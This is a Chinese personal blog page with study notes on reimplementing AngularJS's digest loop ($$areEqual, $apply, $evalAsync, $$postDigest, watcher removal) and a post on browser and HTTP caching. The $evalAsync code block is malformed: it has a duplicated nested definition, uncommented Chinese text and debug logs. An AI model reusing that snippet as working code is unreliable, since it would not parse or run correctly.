<h1 id="对于新旧值的判断-areEqual"><a href="#对于新旧值的判断-areEqual" class="headerlink" title="对于新旧值的判断 - $$areEqual"></a>对于新旧值的判断 - $$areEqual</h1><p>$$digestOnce中使用！==判断新旧值，可以判断值的引用但无法判断值的变更<br>因此在监控器里增加字段valueEq，用来定制判断方法，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,</span><br><span class="line">    listenerFn: listenerFn,</span><br><span class="line">    valueEq: !!valueEq</span><br><span class="line">  &#125;;</span><br><span class="line">  this.$$watchers.push(watcher);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>定制判断方法,抽离成函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$areEqual = function(newValue, oldValue, valueEq) &#123;</span><br><span class="line">  if (valueEq) &#123;</span><br><span class="line">    return _.isEqual(newValue, oldValue);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return newValue === oldValue ||</span><br><span class="line">      (typeof newValue === &apos;number&apos; &amp;&amp; typeof oldValue === &apos;number&apos; &amp;&amp;</span><br><span class="line">       isNaN(newValue) &amp;&amp; isNaN(oldValue));//对NaN特殊情况进行处理</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>判断方法发生改变，进而存储方法也要根据判断方式进行改变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$$digestOnce = function() &#123;</span><br><span class="line">  var self  = this;</span><br><span class="line">  var dirty;</span><br><span class="line">  _.forEach(this.$$watchers, function(watch) &#123;</span><br><span class="line">    var newValue = watch.watchFn(self);</span><br><span class="line">    var oldValue = watch.last;</span><br><span class="line">    if (!self.$$areEqual(newValue, oldValue, watch.valueEq)) &#123;</span><br><span class="line">      watch.listenerFn(newValue, oldValue, self);</span><br><span class="line">      dirty = true;</span><br><span class="line">    &#125;</span><br><span class="line">    watch.last = (watch.valueEq ? _.cloneDeep(newValue) : newValue); //定制存储方式</span><br><span class="line">  &#125;);</span><br><span class="line">  return dirty;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>Angular默认不使用基于值的脏检测的原因，用户需要显式设置这个标记去打开它。</p>
<h1 id="集成外部代码与digest循环-apply"><a href="#集成外部代码与digest循环-apply" class="headerlink" title="集成外部代码与digest循环-$apply"></a>集成外部代码与digest循环-$apply</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//$eval使用一个函数作参数，所做的事情是立即执行这个传入的函数，并且把作用域自身当作参数传递给它，</span><br><span class="line">//返回的是这个函数的返回值。$eval也可以有第二个参数，它所做的仅仅是把这个参数传递给这个函数。</span><br><span class="line">Scope.prototype.$eval = function(expr, locals) &#123;</span><br><span class="line">  return expr(this, locals);</span><br><span class="line">&#125;;</span><br><span class="line">//$apply可以执行一些与Angular无关的代码(expr)，这些代码也还是可以改变作用域上的东西，</span><br><span class="line">//$apply可以保证作用域上的监听器可以检测这些变更。</span><br><span class="line">Scope.prototype.$apply = function(expr) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    return this.$eval(expr);</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    this.$digest();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="延迟执行-evalAsync"><a href="#延迟执行-evalAsync" class="headerlink" title="延迟执行 - $evalAsync"></a>延迟执行 - $evalAsync</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Scope.$$asyncQueue = [];//存储$evalAsync列入计划的任务</span><br><span class="line">Scope.$$phase = null;//作用域上一个简单的字符串属性，存储了现在正在做的信息</span><br><span class="line">//设置$$phase</span><br><span class="line">Scope.prototype.$beginPhase = function(phase) &#123;</span><br><span class="line">  if (this.$$phase) &#123;</span><br><span class="line">    throw this.$$phase + &apos; already in progress.&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  this.$$phase = phase;</span><br><span class="line">&#125;;</span><br><span class="line">//删除$$phase</span><br><span class="line">Scope.prototype.$clearPhase = function() &#123;</span><br><span class="line">  this.$$phase = null;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  this.$beginPhase(&quot;$digest&quot;); //设置状态</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123;</span><br><span class="line">      var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">      this.$eval(asyncTask.expression);</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      this.$clearPhase();</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">  this.$clearPhase();//移除状态</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$apply = function(expr) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    this.$beginPhase(&quot;$apply&quot;);//设置状态</span><br><span class="line">    return this.$eval(expr);</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    this.$clearPhase();//移除状态</span><br><span class="line">    this.$digest();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$evalAsync = function(expr) &#123; 添加任务</span><br><span class="line">  Scope.prototype.$evalAsync = function(expr) &#123;</span><br><span class="line">  var self = this;</span><br><span class="line">  if (!self.$$phase &amp;&amp; !self.$$asyncQueue.length) &#123;</span><br><span class="line">    console.log(1)</span><br><span class="line">    setTimeout(function() &#123;利用异步，连续添加任务后一定会立即digest一次</span><br><span class="line">      console.log(3)</span><br><span class="line">      if (self.$$asyncQueue.length) &#123;</span><br><span class="line">        self.$digest();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(2)</span><br><span class="line">  self.$$asyncQueue.push(&#123;scope: self, expression: expr&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123; </span><br><span class="line">      var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">      this.$eval(asyncTask.expression);</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在监听函数中执行$evalAsync，digest第一次时延迟任务不会被执行，当dirty时，才会被执行<br>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var scope = new Scope();</span><br><span class="line">scope.asyncEvaled = false;</span><br><span class="line"></span><br><span class="line">scope.$evalAsync(function(scope) &#123;</span><br><span class="line">  scope.asyncEvaled = false;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(4)</span><br><span class="line">scope.$evalAsync(function(scope) &#123;</span><br><span class="line">  scope.asyncEvaled = true;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&quot;Evaled after digest: &quot;+scope.asyncEvaled);//true</span><br></pre></td></tr></table></figure></p>
<h1 id="在digest之后执行代码-postDigest"><a href="#在digest之后执行代码-postDigest" class="headerlink" title="在digest之后执行代码 - $$postDigest"></a>在digest之后执行代码 - $$postDigest</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">this.$$postDigestQueue = [];//$$postDigest函数列入计划</span><br><span class="line">Scope.prototype.$$postDigest = function(fn) &#123;</span><br><span class="line">  this.$$postDigestQueue.push(fn);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Scope.prototype.$digest = function() &#123;</span><br><span class="line">  var ttl = 10;</span><br><span class="line">  var dirty;</span><br><span class="line">  this.$beginPhase(&quot;$digest&quot;);</span><br><span class="line">  do &#123;</span><br><span class="line">    while (this.$$asyncQueue.length) &#123;</span><br><span class="line">      try &#123;//执行函数时，使用try-catch进行异常处理</span><br><span class="line">        var asyncTask = this.$$asyncQueue.shift();</span><br><span class="line">        this.$eval(asyncTask.expression);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        (console.error || console.log)(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dirty = this.$$digestOnce();</span><br><span class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</span><br><span class="line">      this.$clearPhase();</span><br><span class="line">      throw &quot;10 digest iterations reached&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; while (dirty);</span><br><span class="line">  this.$clearPhase();</span><br><span class="line"> </span><br><span class="line">  while (this.$$postDigestQueue.length) &#123; //在digest最后执行</span><br><span class="line">    try &#123;</span><br><span class="line">      this.$$postDigestQueue.shift()();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      (console.error || console.log)(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="销毁一个监听器"><a href="#销毁一个监听器" class="headerlink" title="销毁一个监听器"></a>销毁一个监听器</h1><p>在注册监听器时，返回一个销毁该监听器的函数，如果将来要销毁该监听器，就将返回的函数保存<br>在销毁时，直接执行该函数即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</span><br><span class="line">  var self = this;</span><br><span class="line">  var watcher = &#123;</span><br><span class="line">    watchFn: watchFn,</span><br><span class="line">    listenerFn: listenerFn,</span><br><span class="line">    valueEq: !!valueEq</span><br><span class="line">  &#125;;</span><br><span class="line">  self.$$watchers.push(watcher);</span><br><span class="line">  return function() &#123;</span><br><span class="line">    var index = self.$$watchers.indexOf(watcher);</span><br><span class="line">    if (index &gt;= 0) &#123;</span><br><span class="line">      self.$$watchers.splice(index, 1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">var scope = new Scope();</span><br><span class="line">var removeWatch = scope.$watch(</span><br><span class="line">  function(scope) &#123;</span><br><span class="line">    return scope.aValue;</span><br><span class="line">  &#125;,</span><br><span class="line">  function(newValue, oldValue, scope) &#123;</span><br><span class="line">    scope.counter++;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line">removeWatch();</span><br></pre></td></tr></table></figure></p>
<p><a href="https://github.com/xufei/Make-Your-Own-AngularJS/blob/master/01.md" target="_blank" rel="noopener">文档链接</a><br><a href="https://github.com/YooHannah/algorithm/blob/master/baseJs/angulardigest.js" target="_blank" rel="noopener">完整代码</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/cache.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/cache.html" itemprop="url">
                  关于缓存
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-22T16:54:02+08:00">
                2017-10-22
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="缓存的好处"><a href="#缓存的好处" class="headerlink" title="缓存的好处"></a>缓存的好处</h1><p> 利用缓存，可减少对源服务器的访问，因此也就节省了通信流量和通信时间<br> 从而减少了延迟(加快页面打开速度)，降低网络负载，保证稳定性(服务能正常使用)</p>
<h1 id="浏览器本地存储与服务器端存储之间的区别"><a href="#浏览器本地存储与服务器端存储之间的区别" class="headerlink" title="浏览器本地存储与服务器端存储之间的区别"></a>浏览器本地存储与服务器端存储之间的区别</h1><p>其实数据既可以在浏览器本地存储，也可以在服务器端存储。</p>
<p>浏览器端可以保存一些数据，需要的时候直接从本地获取，sessionStorage、localStorage和cookie都由浏览器存储在本地的数据。</p>
<p>服务器端也可以保存所有用户的所有数据，但需要的时候浏览器要向服务器请求数据。<br>1.服务器端可以保存用户的持久数据，如数据库和云存储将用户的大量数据保存在服务器端。<br>2.服务器端也可以保存用户的临时会话数据。服务器端的session机制，如jsp的 session 对象，数据保存在服务器上。实现上，服务器和浏览器之间仅需传递session id即可，服务器根据session id找到对应用户的session对象。会话数据仅在一段时间内有效，这个时间就是server端设置的session有效期。</p>
<p>服务器端保存所有的用户的数据，所以服务器端的开销较大，而浏览器端保存则把不同用户需要的数据分布保存在用户各自的浏览器中。<br>浏览器端一般只用来存储小数据，而服务器可以存储大数据或小数据。<br>服务器存储数据安全一些，浏览器只适合存储一般数据。</p>
<h1 id="http协议里面的缓存机制"><a href="#http协议里面的缓存机制" class="headerlink" title="http协议里面的缓存机制"></a>http协议里面的缓存机制</h1><p>相关首部字段</p>
<p>Expires:资源失效日期<br>收到该字段后会缓存资源，再将缓存的资源给客户端，对于以后的请求，在该时间之前，响应缓存资源，当超过该时间后，缓存服务器在请求发来时，会向服务器请求资源<br>漏洞：用户时间和服务器时间不一致的话，会造成用户资源更新不及时</p>
<p>cache-control:通过配置参数，设置缓存机制，相关参数如下：<br>public:允许多用户共享缓存<br>private：只允许特定用户使用缓存<br>no-cache:在请求中配置，告诉服务器，我不要缓存的响应,中间服务器必须从源服务器取资源;<br>在响应中配置，告诉中间服务器不能对响应进行缓存，源服务器以后对中间服务器提出的有效性校验不在进行确认<br>no-store:请求/响应中含有机密信息，不允许缓存资源<br>max-age:缓存保存时长<br>缓存保存到现在的时长小于该值，就可以返回缓存，否则像源服务器请求资源</p>
<p>last-modified:资源最终修改时间<br>服务器会比较请求的该值与资源最终修改时间，不一致的话就返回新资源，一致的话，就返回304，not modified<br>漏洞：时间精确度到秒，可能存在同一秒保存两次文件，无法区分，<br>也可能因为通过cdn,造成服务器上文件修改时间并不一致</p>
<p>E-Tag:服务器为每份资源提供的唯一性标识，相当于文件MD5值<br>服务器会跟剧请求的if-no-match与资源ttag比较，不一致返回新资源，一致返回304</p>
<p>服务器处理机制：<br>当首部字段Cache-Control有指定max-age指令，Expires也存在时，会优先处理max-age，用于判断资源是否失效<br>当判断max-age失效后，会去判断last-modified和E-Tag，如果服务器仅支持http1.0,则仅根据last-modified做校验<br>如果服务器支持http1.1,则先根据E-Tag做校验，然后在根据last-modified做校验<br><a href="https://iammapping.com/the-http-guide-of-web-cache/" target="_blank" rel="noopener">相关链接</a></p>
<h1 id="资源缓存"><a href="#资源缓存" class="headerlink" title="资源缓存"></a>资源缓存</h1><p>HTML等页面文件:短效缓存，本地服务器<br>更新策略:使用no-cache</p>
<p>css、js:长效缓存，CDN<br>更新策略：在URI上添加更新标识(md5,timestamp,version)<br>MD5：不同文件MD5值如果相同，有覆盖危险<br>timestamp:文件修改/上线时间，因为可能存在不正确性，所以需要其他操作判断文件是否有变化<br>version:每次都需要更新版本号</p>
<p>Image:长效缓存,CDN<br>更新策略：使用随机名字</p>
<h1 id="数据缓存"><a href="#数据缓存" class="headerlink" title="数据缓存"></a>数据缓存</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>在web storage出现前，缓存都放在cookie里面，但存储数量有限，而且每次请求都会携带一堆数据，就会占用宽带<br>工作原理<br>       当浏览器访问服务器时，服务器可以将少量数据以set-cookie消息头的方式发送给浏览器,浏览器会将这些数据临时保存下来。<br>       当浏览器再次访问服务器，会将之前保存的这些数据以cookie消息头的方式发送给服务器。<br>cookie的限制<br>     a. cookie可以被用户禁止。<br>     b. cookie不安全(对于敏感数据，需要加密)。<br>     c. cookie只能保存少量的数据(大约是4k)。<br>     d. cookie的数量也有限制(大约是几百个)。<br>     e.cookie只能保存字符串<br>生存时间问题<br>      缺省情况下，浏览器会把cookie保存在内存里面，只要浏览器不关闭，cookie就会一直存在，浏览器关闭，cookie就会被销毁。<br><a href="http://blog.csdn.net/u011637069/article/details/49799807" target="_blank" rel="noopener">相关链接</a><br><a href="http://www.cnblogs.com/kkgreen/archive/2011/04/12/2014282.html" target="_blank" rel="noopener">相关链接</a></p>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p>大小有限制，数据不安全/不可信(有xss风险，存爆，读取不成功，被损坏)，不应当存放重要数据，并且要做好容错<br>可以用于跨页面通讯<br>永久性的本地存储<br>将数据保存在客户端硬件设备上，不管它是什么，意思就是下次打开计算机时候数据还在<br>localStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。</p>
<h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><p>类似localStorage,但在窗口关闭后不存在<br>会话级别的本地存储<br>通过此对象可以直接操作存储在浏览器中的会话级别的WebStorage。<br>存储在sessionStorage中的数据首先是Key-Value形式的<br>另外就是它跟浏览器当前会话相关，当会话结束后，数据会自动清除，跟未设置过期时间的Cookie类似。即窗口关闭，数据清除<br>sessionStorage提供了四个方法来进行对本地存储做相关操作。<br>（1）setItem(key,value)：添加本地存储数据。<br>（2）getItem(key):通过key获取相应的Value。<br>（3）removeItem(key):通过key删除本地数据。<br>（4）clear():清空数据。<br>注意区别session机制<br>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识(称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用(检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应<br>中随cookie返回给客户端保存。<br>即<br>Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中<br>但cookie可以被人为的禁止，则必须有其他机制以便在cookie被禁止时仍然能够把session id传递回服务器。</p>
<p>经常被使用的一种技术叫做URL重写，就是把session id直接附加在URL路径的后面。还有一种技术叫做表单隐藏字段。就是服务器<br>会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把session id传递回服务器</p>
<h2 id="sessionStorage-、localStorage-和-cookie-之间的区别"><a href="#sessionStorage-、localStorage-和-cookie-之间的区别" class="headerlink" title="sessionStorage 、localStorage 和 cookie 之间的区别"></a>sessionStorage 、localStorage 和 cookie 之间的区别</h2><p>共同点：都是保存在浏览器端，且同源的。<br>区别：<br>1.cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。<br>2.存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。<br>3.数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。<br>4.作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。<br>5.Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。<br>6.Web Storage 的 api 接口使用更方便。<br><a href="http://blog.csdn.net/chen_zw/article/details/18924875" target="_blank" rel="noopener">Cache-control参数解析</a></p>
<h2 id="web-SQL"><a href="#web-SQL" class="headerlink" title="web SQL"></a>web SQL</h2><p>在浏览器端创建的一个本地的数据库，而且支持标准的SQL的CRUD操作，让离线的Web应用更加方便的存储结构化的数据<br>Web SQL Database 规范中定义的三个核心方法：<br>openDatabase：这个方法使用现有数据库或新建数据库来创建数据库对象<br>transaction：这个方法允许我们根据情况控制事务提交或回滚<br>executeSql：这个方法用于执行SQL 查询，用SQL语句做查询索引工作<br><a href="http://www.cnblogs.com/dolphinX/p/3405335.html" target="_blank" rel="noopener">使用链接</a><br><a href="http://www.cnblogs.com/fly_dragon/p/3946012.html" target="_blank" rel="noopener">实例参考</a><br>实际上已经被废弃</p>
<h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><p>适用持续化的数据，不会被清除的数据<br>也相当于在本地创建数据库,通过调用API接口进行数据操作，<br>在IndexedDB大部分操作并不是常用的调用方法，返回结果的模式，而是请求——响应的模式，比如打开数据库的操作<br>不会返回一个DB对象的句柄，得到的是一个IDBOpenDBRequest对象，而希望得到的DB对象在其result属性中<br>对数据的所有操作，增删改查，均通过调用api函数实现<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener">MDN接口文档</a><br><a href="http://www.cnblogs.com/dolphinX/p/3415761.html" target="_blank" rel="noopener">使用教程1</a><br><a href="http://www.cnblogs.com/dolphinX/p/3416889.html" target="_blank" rel="noopener">使用教程2</a><br>持续化存储，可在 web worker中使用</p>
<h1 id="离线缓存"><a href="#离线缓存" class="headerlink" title="离线缓存"></a>离线缓存</h1><h2 id="离线缓存之App-Cache"><a href="#离线缓存之App-Cache" class="headerlink" title="离线缓存之App Cache"></a>离线缓存之App Cache</h2><p>AppCache就是对app内存缓存的方案，具体表现为当请求某个文件时不是从网络获取该文件，而是从本地获取。<br>应用程序缓存为应用带来三个优势：<br>离线浏览 - 用户可在应用离线时使用它们<br>速度 - 已缓存资源加载得更快<br>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源</p>
<p>缺点：<br>可能会缓存错误页面，甚至缓存运营商的劫持广告<br>更新中有一个文件失败了，就会全部退回上一个版本<br>由于是Lazy更新，如果后台接口有break change将会是大麻烦<br>manifest文件也有可能不小心被缓存了</p>
<p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。<br>manifest 文件可分为三个部分：<br>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存，等价于CACHE：<br>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存<br>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面<br><a href="http://blog.csdn.net/liqinghua1653/article/details/31387761" target="_blank" rel="noopener">机制分析</a></p>
<h2 id="离线缓存之service-worker"><a href="#离线缓存之service-worker" class="headerlink" title="离线缓存之service worker"></a>离线缓存之service worker</h2><p>service worker 相当于在浏览器的请求层建了一个服务器，所有的请求都会进入service worker进行处理，决定资源使用缓存还是从新获取服务器资源<br>service worker可以：<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送<br>…</p>
<p>使用时必须使用HTTPS请求协议</p>
<p>在 installing 状态中，Service Worker 脚本中的 install 事件被执行。通常在安装事件中，为 document 缓存静态文件<br>处于 activating 状态期间，Service Worker 脚本中的 activate 事件被执行。通常在 activate 事件中，清理 cache 中的文件<br>如果 Service Worker 处于激活态，就可以监听事件性事件 —— fetch 和 message。<br>service worker可以通过fetch事件拦截请求，并且给出自己的响应。<br>页面和serviceWorker之间可以通过posetMessage()方法发送消息，发送的消息可以通过message事件接收到。</p>
<p>w3c提供了一个新的fetch api，用于取代XMLHttpRequest，与XMLHttpRequest最大不同有两点：</p>
<ol>
<li>fetch()方法返回的是Promise对象，通过then方法进行连续调用，减少嵌套。ES6的Promise在成为标准之后，会越来越方便开发人员。</li>
<li>提供了Request、Response对象，如果做过后端开发，对Request、Response应该比较熟悉。前端要发起请求可以通过url发起，也可以使用Request对象发起，而且Request可以复用。但是Response用在哪里呢？在service worker出现之前，前端确实不会自己给自己发消息，但是有了service worker，就可以在拦截请求之后根据需要发回自己的响应，对页面而言，这个普通的请求结果并没有区别，这是Response的一处应用。</li>
</ol>
